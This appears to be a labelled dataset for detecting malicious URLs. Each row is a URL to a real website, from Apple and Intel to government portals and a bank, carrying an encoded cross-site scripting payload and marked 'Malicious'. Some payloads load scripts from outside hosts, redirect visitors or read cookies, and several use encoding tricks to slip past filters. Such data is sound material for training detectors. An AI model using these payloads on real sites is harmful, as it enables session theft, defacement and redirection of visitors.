http://insideapple.apple.com/updateacct/cbx-cgi.do?v=2&amp;la=fr&amp;lc=fr%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c<br>/marquee%3e,Malicious
http://www.xzqh.cn/otype_d.asp?owen1=%3ciframe%20src=http://www.google.com%3e%3c/iframe%3e&amp;owen2=%b5<br>%d8%c3%fb%b9%e6%b7%b6,Malicious
http://glacier.visitmt.com/categories/primaryresults.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;<br>/script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.yamagatakanko.com/cgi/event.cgi?m=7&amp;a=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3<br>e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehe<br>m%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibern<br>autica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.i<br>espana.es/xss.html%20%3c,Malicious
https://bbms.info/cgi-bin/aw-login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.oceansurf.ca/gallery.php?id=16%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.pctrio.com/image/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticx<br>s&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://supplier.intel.com/supplierhub/redirect.asp?url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.culturepub.fr/recherche.html?q=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript<br>%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.feuerwehr.li/site/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.skai.gr/cvresults.php?id='%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%3ch1%<br>3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.politicalbase.com/index.php?obj=18&amp;searchtype=&amp;term=%22%3e%3cscript%3ealert%28%2fxss%2f%2<br>9%3c%2fscript%3e%3ca+foo%3d%22,Malicious
http://www.lumberjackdays.com/ljdgallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://de.motorrad.cars.yahoo.net/nuovo/moto/marca.php3?modello=&quot;&gt;&lt;script&gt;alert(/nemessis-www.rstzon<br>e.org/)&lt;/script&gt;&amp;marca=piaggio,Malicious
http://www.oneview.de/tags/index.jsf?search=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e,Malicious
http://www.aidshilfe.de/index.php?id=11615&amp;sessionlanguage=de&amp;sessioncountry=%3c%22%3c%3cscript%3eal<br>ert(1)%3c/script%3e,Malicious
http://esearch.avaya.com/r/results.asp?querytext=%3e%3cscript%3ealert%28gurus%29%3c%2fscript%3e%3cce<br>nter%3e%3cfont+size%3d20%3egurus+%3c%2fcenter%3e%3cbr%3e%3cmarquee%3edont+mess+with+us%3c%2fmarquee%<br>3e%3c%2ffont%3e&amp;go.x=11&amp;go.y=3&amp;go=go&amp;site=red,Malicious
http://baltimore.orioles.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.woburnstudios.com/leeboyflex2/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.edusoftlearning.com/popups/showpic.asp?src=%22%3e%3cscript%3ealert(666)%3c/script%3e,Malicious
http://www.jobware.de/st/index.html?js=1&amp;ty=198&amp;st=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscrip<br>t%3e&amp;x=0&amp;y=0,Malicious
http://www.topgear.com/uk/search?phrase=&quot;%2f&gt;&lt;script&gt;alert('jeremy+clarkson+for+president!')%3b&lt;%2fs<br>cript&gt;&amp;x=0&amp;y=0&amp;typefilter=video,Malicious
http://zakupki.gov.ru/pgz/public/action/search/quick/run?currentsearchstring=/&quot;&gt;&lt;script&gt;alert('xss<br>by atm0n3r')&lt;/script&gt;,Malicious
http://eshop.ikeastampa.it/it/catalogue/ricerca.asp?keywords=%22%3e%3cscript%3ealert%28%22xss%22%29%<br>3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.houra.fr/stk/indexstatic.php?page=clients&amp;come_from=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.clipsharedemo.com/search/?search_id=374977%22%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e&amp;search_type=search_videos,Malicious
http://www.softwarevault.info/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://hubblesite.org/gallery/album/search.php?method=and&amp;format=normal&amp;sort=score&amp;config=picturealb<br>um&amp;restrict=entire_collection%2fpr&amp;exclude=&amp;words=%3c/h3%3e%3c/div%3e%3ch1%3exssed%20by%20%3cbr%3ego<br>oglebig.com%3c/h1%3e,Malicious
http://www.mjspaca.jeunesse-sports.gouv.fr/recherche.php?mot=%27%3balert%28string.fromcharcode%2883%<br>2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharco<br>de%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromc<br>harcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28stri<br>ng.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fsc<br>ript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2<br>c32%2c83%2c85%2c88%29%29%3c%2fscript%3e%3cbody+onload%3dalert%28%27xss%27%29%3e&amp;x=5&amp;y=13,Malicious
http://www.musicorama.tv/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3<br>e,Malicious
http://www.redtube.com/iframe/tower/rtlive006/index.php?id=%22%3e%3cscript%3ealert('xssed')%3c/scrip<br>t%3e,Malicious
http://www1.orange.co.uk/businesspartners/index.php?region=%22%3e%3cscript%3ealert%28document.cookie<br>%29%3c/script%3e,Malicious
"http://www.jobs.ie/jobs.aspx?categories=&amp;regions=&amp;keywords=';alert(string.fromcharcode(88,83,83))//\<br>';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.from<br>charcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://ms104.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.bibliotecas.cm-amadora.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxt<br>rm=20&amp;trmcols=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
"http://www.allmusic.com/pointroll/pointrollads.htm?pub=http://www.google.com?+&amp;redir=%27%3e%3cscript<br>%3ewindow.location=location.search.substring(5,28).concat(document.domain)%3c/script%3e&amp;ad=g235e2005<br>1011164320",Malicious
http://goodrugn.com/index.php?said=u56_ore_20&amp;q=%3cscript%3ealert%28%27xssed%27%29%3c%2fscript%3e&amp;bt<br>ng,Malicious
http://www.foodsafetyforum.org/african/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cb<br>r%3e%3cmarquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://store.metallica.com/store/checkouterror.asp?error=-1&amp;msg=%22%3e%3cscript%3ealert(%22daimon%22<br>)%3c/script%3e,Malicious
http://www.etu.edu.tr/?page=1&amp;lang=http://www.etu.edu.tr/?page=1&amp;lang=&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
http://www.news-kurd.com/newskurd/?month=10&amp;day=21&amp;year=2007'%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/membres/mot_de_passe_oublie.asp?service=genealogie-en-ligne<br>&amp;methode=email&amp;email=%22%3e%3clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesh<br>eet%3e&amp;reponse=nontrouve,Malicious
http://profiles.emcdda.europa.eu/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%<br>3cmarquee%3e%3ch1%3exxxxxxxxx%3c/h1%3e%3c/marquee%3e,Malicious
http://www.southquest.biz/classifieds/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.meelkop.nl/album/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.axn-india.com/search/node/'%22--%3e%3cscript%3ealert(/w0ot/)%3c/script%3e,Malicious
http://www.wwf.org.co/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious
http://myboard.jp/i/bbs/write.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script<br>%3e&amp;,Malicious
http://latam.benq.com/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://secure.avast.com/scripts/register.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;%3e%3cma<br>rquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,Malicious
https://shop.webservis.com.tr/sorgulama1.asp?domain=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;domain_n<br>o_kontrol=1&amp;urun_codu=,Malicious
http://myboard.jp/i/bbs/list.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%<br>3e,Malicious
http://www.katholisches-bildungsforum.de/meng/meng/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://bst.blogpeople.net/search_result.jsp?keyword=%22%3e%27%3e%3c%2fscript%3e%3cscript%3ealert%28%<br>22xss%22%29%3c%2fscript%3e&amp;query=%8c%9f%8d%f5&amp;option=on,Malicious
http://www.bp.com/search.do?cf=&amp;gf=&amp;tf=&amp;nf=&amp;bf=&amp;re=false&amp;pe=&amp;de=false&amp;rl=&amp;cl=&amp;nl=&amp;bl=&amp;ml=&amp;lf=&amp;ls=&amp;lc<br>=&amp;ll=&amp;lb=&amp;cp=1&amp;ra=&amp;fl=n&amp;kw=%3ciframe+onload%3dalert(1)+src%3dx&amp;categoryid=1&amp;sc=1,Malicious
http://www.poetry.com/greatestpoems/poemlove.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;<br>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://ksenz.svistok.ru/clubthread.php?param=%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ironzorg%3c/h<br>1%3e%3c/marquee%3e&amp;cid=3&amp;ans=13606&amp;seed=00&amp;p=13,Malicious
http://lib.tjarts.edu.cn/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://live.sohosai.com/php/showcm_vga.php?name=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%3<br>7%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39<br>%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://gw2.geneanet.org/index.php3?b=kempfmann&amp;lang=en;pz=joshua+daniel;nz=black;ocz=0;p=nancy+davis<br>;n=&lt;iframe src=http://google.com&gt;,Malicious
http://www.cialistr.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/script<br>%3e,Malicious
http://website.ws/whois.dhtml?domain=%22%3e%3cscript%3ealert(%22fux0r%22)%3c/script%3e,Malicious
http://www.j-gate.informindia.co.in/librarian/publisher.asp?alphabet=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(doc<br>ument.cookie)&lt;/script&gt;,Malicious
http://catalogue.nla.gov.au/search/home?lookfor=}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba(<br>b(%2fxss%2f.source))%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss%3c%2fh1%3e%3c%2fm<br>arquee%3e&amp;type=all&amp;limits=&amp;submit=find,Malicious
http://www.michelin.fi/fi/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://environment-data.uchicago.edu/esintern/detail.cfm?jobid=%3cscript%3ealert(document.cookie);%3<br>c/script%3e,Malicious
http://buscar.hispavista.com/?cadena=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%<br>3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e<br>%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e<br>%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://cgi.din.or.jp/~kazupon/cgi-bin/keijiban/c-board.cgi?word=&amp;way=0&amp;target=all&amp;view=0&amp;id=''%3e%22<br>%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e&amp;cmd=src&amp;x=18&amp;y=13,Malicious
http://www.olx.lt/searchpages.php?searchbox=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;section=24<br>0,Malicious
http://www.zufus.it/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticx<br>s&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://ro.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.avis.co.uk/site-search?header-site-search=%27%3e%3cscript%3ealert%28+document.cookie%29%3c/script%3e,Malicious
http://www.scratchnsniff.co.uk/mats/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://workflow.ecc-astdinstitute.org/index.cfm?sc=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.klenky.ch/gu3stbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"https://club2020.mi.vodafone.es/rascaygana/mailing/mail_alta.php?telefono_encriptado=&quot;&gt;&lt;script&gt;alert<br>(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://users.gametrailers.com/password_reset_script.php?input[email]=&amp;input[hash]=--%3e%3cscript%3ea<br>lert(document.cookie);%3c/script%3e,Malicious
http://www.e-soft24.com/scripts/membershipsite/manager/index.php?action=search&amp;key=/&quot;&gt;&lt;script&gt;alert(<br>'xss by atm0n3r')&lt;/script&gt;,Malicious
http://search.amd.com/query.html?col=test&amp;ht=test1&amp;la=en&amp;qt=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;<br>qs=|+language%3aen&amp;ct=1325960345&amp;qm=1&amp;ql=&amp;lk=1&amp;rf=0&amp;ws=0&amp;tqmhak=0&amp;lap=%22%3e%3cscript%3ealert(1)%3c/<br>script%3e,Malicious
http://se.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://amihackerproof.com/results/tos.php?scan_id=25988%3c/script%3e%3cscript%3ealert('xss');%3c/script%3e,Malicious
http://img269.imageshack.us/slideshow/webplayer.php?id=%3cscript%3ealert%281337%29;%3c/script%3e,Malicious
http://www.cm-coimbra.pt/bmc/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fomentodeportivo.gob.mx/buscar.php?busquedatexto=%3e%22%3e%3cscript%20%0a%0d%3ealert(docu<br>ment.domain)%3b%3c/script%3e&amp;seleccion=noticias&amp;submit=buscar,Malicious
http://seaftyy.jp/?m=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marq<br>uee&gt;,Malicious
http://www.hojo.com/howardjohnson/control/booking/property_info?propertyid=f00z%22;--%3e%3c/script%3<br>e%3cscript%3ealert('xssed%20from%20sshjason');%3c/script%3e&amp;brandinfo=hj&amp;cid=%eaid!,Malicious
http://www.charlotteswebb.net/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0<br>a%0d%3ealert(document.cookie)%3b%3c/script%3e,Malicious
http://answercenter.ebay.com/emoticons.jsp?formname=%22%3e%3c/script%3e%3cscript%3ealert('xss')%3c/script%3e0xali+-+xssed%3c!--,Malicious
http://aiw2.uspto.gov/.aiw?homeurl=%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
"http://bdstest.maharashtra.gov.in/examples/budgetmvc/jsp/mis/currentstatus_nschemewise.jsp?dept=c,c-<br>07,2415%22%3e%3e%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e",Malicious
http://videos.mmaweekly.com/search_results.php?search_phrase=%27%22%3e%3cscript%3ealert%28document.c<br>ookie%29%3b%3c%2fscript%3e&amp;category=,Malicious
"http://login.pathfinder.gr/index.php?plogin=';alert(string.fromcharcode(88,83,83))//\';alert(string.<br>fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88<br>,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.aviacioncivilsalta.gov.ar/verpersonal-en.php?id=0&amp;amp;m=%22%3e%3cscript%3ealert%28/ar3sw0<br>rmed/%29;%3c/script%3e,Malicious
http://manyeyes.alphaworks.ibm.com/manyeyes/visualizations?q=%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious
http://skin.bebo.com/search2.jsp?searchterm=%3c/title%3e%3c/head%3e%3cbody%3e%3cscript%20src=%22http<br>://googlebig.com/l.js%22%3e%3c/script%3e,Malicious
http://david-o-hara.com/livre/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mjsbretagne.jeunesse-sports.gouv.fr/spip.php?page=recherche&amp;recherche=%3cscript%3ealert(1<br>23)%3c/script%3e&amp;rechercher_btn.x=0&amp;rechercher_btn.y=0,Malicious
http://www.disccrs.org/abstracts.html?dialog=on&amp;disccrs=on&amp;match=or&amp;words=%3cscript%3edocument.docum<br>entelement.innerhtml%3d%22xss+found%22%3b%3c%2fscript%3e&amp;search=search&amp;search=search,Malicious
http://nipper.com.mx/login.php?mensaje=%3ch1%3e%3cmarquee%3ehacked%20by%20norehem%3c/marquee%3e%3c/h<br>1%3e,Malicious
http://www.web-catalog.kiev.ua/sitemap/phpinfo.php?a[]=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.zappos.com/bin/notifyme?email=%3cscript%3ealert(document.cookie)%3c/script%3e@%3cbar%3e.c<br>om&amp;size_id=142&amp;width_id=226&amp;color_id=23257&amp;general=on&amp;p=7396149&amp;submit=notify+me!,Malicious
http://www.gazetemuzik.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;,Malicious
http://www.ct.gov/ctportal/taxonomy/ct_taxonomy.asp?dln=27537&amp;ctportalnav=%22/%3e%3ciframe%20src=htt<br>p://google.com%3e%3c/iframe%3e%3cscript%20src=http://ha.ckers.org/xss.js?/%3e,Malicious
http://channel.patzzi.joins.com/channel/testzone/test_aa.asp?seq=%22%3e%3ciframe%20src=/%3e%3c/ifram<br>e%3e,Malicious
http://www.pagina.se/seek.asp?seek=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e%3ch<br>1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.vietmanagement.com.vn/jobsite/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.southquest.biz/classifieds/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.intel.com/default.aspx?method=text%22&lt;script&gt;alert(document.cookie)&lt;/script&gt;%22&amp;c=en_u<br>s&amp;q=xxx,Malicious
https://service.versatel.de/shop/forms.kt?aomod_vm=&amp;telko=versatel&amp;session_id=427f29317e7cf495078b45<br>a7ff3582c4&amp;vpn=&amp;kuvpn=&amp;vpsuffix=&amp;ktkundentyp=pk&amp;hvt=1&amp;tester=1%5ct2%5ct3%5ct4%5ct5&amp;hvtstrasse=%22%3e<br>%3cscript%3ealert%281%29%3c%2fscript%3e&amp;hvtnummer=1234&amp;hvtplz=12345&amp;hvtort=12345&amp;weiter.x=91&amp;weiter.<br>y=10,Malicious
http://www.lamed.fr/components/print/emailtofriend.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://amb.vis.ne.jp/mozilla/scrapbook/feature3.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.geoconcept.com/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello%20the%20ra<br>t')%3c/script%3e&amp;var_lang=fr,Malicious
http://hopla.fr/detail.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.eufootball.biz/?month=3&amp;day=2&amp;year=2007%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e%3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://suche.kas.de/cgi-bin/search.cgi?q=%22%3e%3cscript%3ealert(%22pwnd%20for%20big-h(;%22)%3c/scri<br>pt%3e,Malicious
http://www.21dan.com/sr/saznajvise/teme.html?view=comment&amp;topicid=14206&amp;type=&quot;/&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://support.technorati.com/search.php?q=%22%3e%3cscript%3ealert%28%2ftotalschaden%2f%29%3c/script<br>%3e,Malicious
http://www.nstalker.com/nstalker/updates/index.php?code=9e99c11a228c55c803e45a4101448946;--&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;,Malicious
http://www.bibliovalle.gov.co/evento.php?eventosid=247}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/x<br>ss/.source));%3c/script%3e,Malicious
http://www.scsite.com/off2003/index.cfm?action=more&amp;product=%22%3e%3cscript%3ealert('xss')%3c/script<br>%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,Malicious
http://www.avg.co.uk/%22%3e%27%3e%3cscript%3ealert(/xss%20by%20mygot_manoel/)%3c/script%3e,Malicious
http://indicateurs.education.gouv.fr/resultlyceeg.php?code=&amp;annee=%22%3e%3cscript%3ealert(document.c<br>ookie)%3c/script%3e,Malicious
http://www.jeuxvideo.fr/api/mot_de_passe_perdu.php?support=jvfr&amp;username=%3cscript%3ealert%28%2fxss+<br>by+mystick%2f%29%3c%2fscript%3e&amp;email=,Malicious
http://eur-lex.europa.eu/result.do?arg0=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%3c<br>h1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e&amp;arg1=%3ca%20onmouseover=alert(/st@r-gaz3r/)%3e;)%3ca/%3e&amp;arg2<br>=%3ca%20onmouseover=alert(/st@r-gaz3r/)%3e;)%3ca/%3e&amp;titre=titre&amp;chlang=en&amp;rechtype=rech_mot&amp;submit=<br>search,Malicious
http://www.gbt.ch/forum_topic.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://portalavisos.com.ar/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://trc0der.com/forum/non_rte_javascript.asp?textarea=%22%3e%3cscript%3ealert('%c4%b0ts%20like%20<br>a%20xss=)%20:d')%3c/script%3e,Malicious
http://www.eurofootball.lt/index.php?lpage=search&amp;page=search&amp;s=%22%3e%3cscript%3ealert(7);%3c/scrip<br>t%3e,Malicious
http://locoboard.jp/edit.php?id=test&amp;no=13952'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3<br>c/script%3e,Malicious
http://names.nnov.ru/login.php?optype=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.grandvalira.com/escola/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%<br>3cmarquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.fakeproject.org/content.php?koi=newsletter&amp;nom=%27%22%3e%3cscript%3ealert(1337)%3c%2fscri<br>pt%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;mail=%27%22%3e%3cscript%3ealert(<br>1337)%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;gsm=%27%22%3e%3cs<br>cript%3ealert(1337)%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=6<br>2&amp;y=9,Malicious
https://bankingportal.sparkasse-krefeld.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de<br>%3e,Malicious
